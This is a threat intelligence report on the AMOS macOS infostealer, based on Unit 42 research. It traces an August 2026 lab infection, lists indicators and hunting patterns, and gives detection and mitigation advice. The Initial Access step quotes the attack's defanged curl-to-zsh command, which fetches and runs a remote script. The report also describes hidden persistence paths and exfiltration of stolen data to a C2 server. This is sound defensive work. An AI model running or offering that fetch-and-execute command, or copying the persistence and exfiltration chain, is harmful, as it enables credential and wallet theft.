# AMOS Stealer Uses Deceptive Setup Guides to Target macOS Systems

**Severity:** high | **Category:** Malware,Threat Intelligence,Mobile Security | **Updated:** 2026-09-16 | **Reading time:** 7 min

An analysis of the Atomic macOS (AMOS) Stealer reveals its evolving tactics for compromising Apple systems. Threat actors are using deceptive websites with fake setup instructions to trick users into manually executing malicious scripts. This method bypasses some traditional defenses and allows the stealer to harvest system information, browser credentials, and cryptocurrency wallet data. The malware's infrastructure, including C2 servers and domains, changes frequently, making detection challenging. This report breaks down the infection chain from an August 2026 case, providing technical details, indicators of compromise, and mitigation strategies for defenders.

## Executive Summary

This report details a recent analysis of the **[Atomic macOS (AMOS) Stealer](https://unit42.paloaltonetworks.com/atomic-macos-amos-stealer-activity/)**, an evolving information-stealing malware targeting the **[macOS](https://www.apple.com/macos/)** platform. Based on research from **[Unit 42](https://unit42.paloaltonetworks.com/)**, this threat leverages social engineering through deceptive websites that instruct users to copy and paste malicious commands into their Terminal. Once executed, the malware establishes persistence, steals sensitive data from web browsers and cryptocurrency wallets, and exfiltrates it to a command and control (C2) server.

Key findings indicate that **AMOS** is under active development, with its supporting infrastructure—including domains, IP addresses, and file paths—changing frequently. This dynamic nature complicates signature-based detection. The infection requires user interaction, including entering an administrative password, which underscores the critical role of user awareness and training. This analysis provides defenders with a technical breakdown of the attack chain, actionable indicators of compromise (IOCs), and recommendations for detection, hunting, and mitigation.

## Threat Overview

**[AMOS](https://unit42.paloaltonetworks.com/atomic-macos-amos-stealer-activity/)** is an information stealer first seen advertised on **[Telegram](https://telegram.org/)** in April 2024. It represents a significant and growing threat to **macOS** users, specifically designed to exfiltrate system information, login credentials, cookies, and data from cryptocurrency wallets. The malware is distributed through various channels, including malvertising, trojanized installers masquerading as cracked software, and deceptive websites.

This analysis focuses on an infection generated in a lab environment on August 5, 2026. The initial vector was a malicious webpage hosted on `getmacouscloud[.]com`, which purported to offer a “macOS toolkit.” The page instructed the user to copy a command and paste it into a **macOS** Terminal window. This technique, while similar in principle to **[ClickFix](https://unit42.paloaltonetworks.com/clickfix-technique/)** campaigns, relies on direct user action to initiate the infection chain, effectively making the user an unwitting accomplice in the compromise of their own system.

## Technical Analysis

The attack chain demonstrates a multi-stage process involving social engineering, script execution, and payload delivery.

1.  **Initial Access & Execution**: The user is socially engineered to visit a malicious site (`getmacouscloud[.]com`). The site instructs them to copy a `curl` command and paste it into a Terminal window. This action corresponds to MITRE ATT&CK [`T1204.002 - User Execution: Malicious File`](https://attack.mitre.org/techniques/T1204/002/). The command `curl hxxps[:]//ferncore13[.]com/curl/608e70d1338612686917ee5cd300ff7ed8e318dfd787a50257f92142e99bd688 | zsh` downloads and pipes a Z-shell (Zsh) script for immediate execution ([`T1059.004 - Command and Scripting Interpreter: Unix Shell`](https://attack.mitre.org/techniques/T1059/004/)). This method of using a legitimate tool like `curl` is a form of Ingress Tool Transfer ([`T1105 - Ingress Tool Transfer`](https://attack.mitre.org/techniques/T1105/)).

2.  **Payload Staging**: The initial Zsh script contains a Base64-encoded, GZIP-compressed payload. Upon execution, it decodes and decompresses this payload, revealing a second Zsh script. This script is responsible for downloading the primary malware component, a Mach-O binary.

3.  **Privilege Escalation & Defense Evasion**: The script saves the Mach-O binary as `/tmp/helper`. During this process, the system prompts the user for their password. By entering the password, the user grants administrative privileges, allowing the malware to proceed with its installation and persistence mechanisms ([`T1548.004 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching`](https://attack.mitre.org/techniques/T1548/004/)).

4.  **Persistence**: The malware establishes persistence by creating hidden files and directories. It creates a `.plist` file at `/tmp/starter` which points to a new shell script located at `/Library/Application Support/.com.apple.accountsd/.service`. This script is configured to run the main stealer payload, `AccountsHelper`. This use of a `.plist` file is a common persistence method on **macOS**, often leveraging LaunchAgents ([`T1543.001 - Create or Modify System Process: LaunchAgent`](https://attack.mitre.org/techniques/T1543/001/)). The use of dot-prefixed directories like `.com.apple.accountsd` is a technique for hiding artifacts ([`T1564.001 - Hide Artifacts: Hidden Files and Directories`](https://attack.mitre.org/techniques/T1564/001/)). A similar mechanism was observed in the `/.com.apple.metadata.mds/` directory.

5.  **Collection**: Once active, **AMOS** scans the system for sensitive information. It targets various applications, particularly web browsers and cryptocurrency wallets. The collected data is staged in the `/tmp` directory and compressed into a single archive named `out.zip` ([`T1560.001 - Archive Collected Data: Archive via Utility`](https://attack.mitre.org/techniques/T1560/001/)). The structure of `out.zip` indicates searches for credentials, cookies, and wallet files ([`T1555 - Credentials from Password Stores`](https://attack.mitre.org/techniques/T1555/)).

6.  **Command & Control (C2) and Exfiltration**: The malware exfiltrates the `out.zip` archive via HTTP POST requests to a C2 server, which in this case was `161.35.146[.]120`. The URL paths used in the POST requests (`/passwords`, `/wallets`, `/cookies`) clearly indicate the type of data being stolen. This aligns with [`T1041 - Exfiltration Over C2 Channel`](https://attack.mitre.org/techniques/T1041/) using web protocols ([`T1071.001 - Application Layer Protocol: Web Protocols`](https://attack.mitre.org/techniques/T1071/001/)).

## Impact Assessment

The primary impact of an **AMOS** infection is the theft of sensitive data, leading to significant risks for both individuals and organizations:

*   **Financial Loss**: Direct theft of funds from compromised cryptocurrency wallets and potential for fraudulent transactions using stolen financial information from browsers.
*   **Credential Compromise**: Stolen login credentials for web services, corporate accounts, and personal accounts can be used for follow-on attacks, account takeover, and further network intrusion.
*   **Data Breach**: Exfiltration of sensitive documents, browser history, and system information can lead to privacy violations and exposure of proprietary or personal data.
*   **Reputational Damage**: For organizations, a compromise of employee machines can lead to a larger breach, damaging the company's reputation and eroding customer trust.

Because the malware requires administrative privileges to install fully, its potential impact is high, as it can achieve deep system access and persistence.

## IOCs — Directly from Articles

The following indicators were observed in the analysis from early August 2026. Note that this infrastructure is likely no longer active.

| Type | Value | Description |
| :--- | :--- | :--- |
| Domain | `getmacouscloud[.]com` | Malicious domain hosting deceptive instructions. |
| Domain | `ferncore13[.]com` | Domain hosting the initial Zsh script. |
| URL | `hxxps[:]//ferncore13[.]com/curl/608e70d1338612686917ee5cd300ff7ed8e318dfd787a50257f92142e99bd688` | Full URL for the initial script payload. |
| IP Address | `161.35.146[.]120` | C2 server from the August 5, 2026 infection. |
| IP Address | `188.166.78[.]138` | C2 server from a July 31, 2026 infection. |
| File Path | `/tmp/helper` | Initial Mach-O binary installer. |
| File Path | `/tmp/starter` | Malicious plist file. |
| File Path | `/Library/Application Support/.com.apple.accountsd/.service` | Persistence shell script. |
| File Path | `/Library/Application Support/.com.apple.accountsd/AccountsHelper` | AMOS stealer Mach-O binary. |
| File Path | `/Library/Application Support/.com.apple.metadata.mds/.mdworker` | Secondary persistence shell script. |
| File Path | `/Library/Application Support/.com.apple.metadata.mds/mdworker_shared` | Secondary AMOS stealer Mach-O binary. |
| File Name | `out.zip` | Name of the compressed archive containing stolen data. |

## Cyber Observables — Hunting Hints

Security teams can hunt for potentially related activity by looking for the following patterns:

| Type | Value | Description |
| :--- | :--- | :--- |
| Command Line Pattern | `curl .* \| .*sh` | Suspicious use of curl to pipe scripts directly into a shell interpreter like `sh`, `bash`, or `zsh`. |
| Process Name | `zsh` | Execution of Zsh scripts, especially when spawned by unusual parent processes. |
| File Path | `/tmp/*.zip` | Creation of zip files in the `/tmp` directory, which is a common staging area for exfiltration. |
| Network Traffic Pattern | `HTTP POST` | Outbound HTTP POST requests to unknown or newly seen IP addresses, especially with large payloads. |
| File Path | `/Library/Application Support/.*` | Creation of new hidden directories (starting with a dot) within `/Library/Application Support/`. |

## Detection & Response

Defenders should implement a multi-layered detection strategy:

1.  **Endpoint Detection and Response (EDR)**: Deploy EDR solutions capable of monitoring **macOS** process execution and shell commands. Create detection rules for the `curl | sh` pattern, especially when initiated from a browser or other non-standard application. Monitor for processes that create hidden files in `/Library/Application Support/` or write executable files to `/tmp/`. D3FEND's **[Process Analysis (D3-PA)](https://d3fend.mitre.org/technique/d3f:ProcessAnalysis)** is a key technique here.

2.  **Network Monitoring**: Monitor outbound HTTP/S traffic for connections to known malicious IPs and domains. Use **[Network Traffic Analysis (D3-NTA)](https://d3fend.mitre.org/technique/d3f:NetworkTrafficAnalysis)** to baseline normal traffic and alert on anomalies, such as large uploads via POST requests to uncategorized IP addresses.

3.  **Log Analysis**: Collect and analyze shell history logs (e.g., `.zsh_history`, `.bash_history`) for suspicious commands. Review logs for `sudo` events and correlate them with subsequent file creation or network activity.

4.  **Threat Hunting**: Proactively hunt for the IOCs and observables listed above. Query endpoints for the presence of the specified file paths and look for evidence of the described persistence mechanisms.

## Mitigation

*   **User Training ([M1017](https://attack.mitre.org/mitigations/M1017/))**: The most critical defense is user education. Train users to never copy and paste commands from untrusted websites into a Terminal. Explain the dangers of running scripts from unknown sources.
*   **Privileged Account Management ([M1026](https://attack.mitre.org/mitigations/M1026/))**: Enforce the principle of least privilege. Users should not run with administrative rights for daily tasks. This would prevent the malware from installing its persistence mechanisms even if the user enters their password.
*   **Execution Prevention ([M1038](https://attack.mitre.org/mitigations/M1038/))**: Use application control solutions to restrict the execution of unauthorized scripts and binaries. Configure policies that prevent shells from being spawned by web browsers.
*   **Network Filtering ([M1037](https://attack.mitre.org/mitigations/M1037/))**: Use web filters and firewalls to block access to known malicious domains and C2 IPs. Employ an outbound traffic filtering policy to prevent connections to unauthorized destinations.
*   **Endpoint Protection ([M1049](https://attack.mitre.org/mitigations/M1049/))**: Deploy and maintain an up-to-date antivirus or EDR solution on all **macOS** endpoints. While the indicators for **AMOS** change frequently, behavioral detection can often identify its malicious activities.

**Tags:** infostealer, macOS, Zsh, data theft, credential theft, malvertising

## Sources
- [Atomic macOS (AMOS) Stealer Activity](https://unit42.paloaltonetworks.com/atomic-macos-amos-stealer-activity/) — Unit 42 (2026-09-16)

---
Source: https://cyber.netsecops.io/articles/atomic-macos-amos-stealer-activity-analysis/
